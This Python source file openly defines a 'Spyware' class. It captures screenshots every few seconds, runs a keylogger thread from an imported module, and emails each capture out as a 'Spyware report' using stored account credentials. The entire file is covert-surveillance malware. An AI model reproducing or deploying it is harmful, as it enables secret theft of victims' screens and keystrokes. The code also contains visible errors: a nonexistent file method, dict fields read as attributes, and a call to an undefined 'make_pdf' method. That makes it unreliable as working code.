import pyscreenshot as ImageGrab
from time import sleep
from mss import mss
from threading import Thread
import cv2
import os
from PIL import Image
import shutil
from functools import partial
import multiprocessing
import json
import random

from modules.log import Logger
from modules.send_email import send_mail


class Spyware:
    def __init__(self):
        self.screenshot_state = True
        self.screenshot_period = 5

        with open('./user_info/info.json') as input_file:
            reader = input_file.reader()
            self.user_info = json.loads(reader)

    def send_report(self, file_path):
        message_rep = 'Full report (keylogger + screenshots + audio)'
        try:
            send_mail(self.user_info.email, self.user_info.password, message_rep, 'Spyware report', file_path)
        except:
            error_msg = 'Could not send that IMG'
            send_mail(self.user_info.email, self.user_info.password, error_msg, 'Spyware report', file_path)

    def make_screenshot(self):
        user_path = os.path.expanduser('~\\documents')

        sct = mss()
        counter = 0

        while True:
            if not self.screenshot_state:
                return

            counter += 1
            sleep(self.screenshot_period)

            im = ImageGrab.grab()
            try:
                im.save(f'{user_path}\\images_record\\image{counter}.png')

                report_thread = Thread(target=partial(self.send_report, f'{user_path}\\images_record\\image{counter}.png'),
                                    daemon=True)
                report_thread.start()

                report_thread.join()

            except:
                pass

    def start(self):
        user_path = os.path.expanduser('~\\documents')
        logger = Logger()

        if not os.path.isdir(f'{user_path}\\images_record'):
            os.mkdir(f'{user_path}\\images_record')


        async_tasks = [Thread(target=self.make_screenshot, daemon=True), Thread(target=logger.init, daemon=True)]
        [t.start() for t in async_tasks]

        while True:
            que = input('')

            if que == 'k':
                self.screenshot_state = False
                self.make_pdf()
                break
            else:
                print('\n')
        [t.join() for t in async_tasks]


if __name__ == '__main__':
    multiprocessing.freeze_support()

    spw = Spyware()
    spw.start()
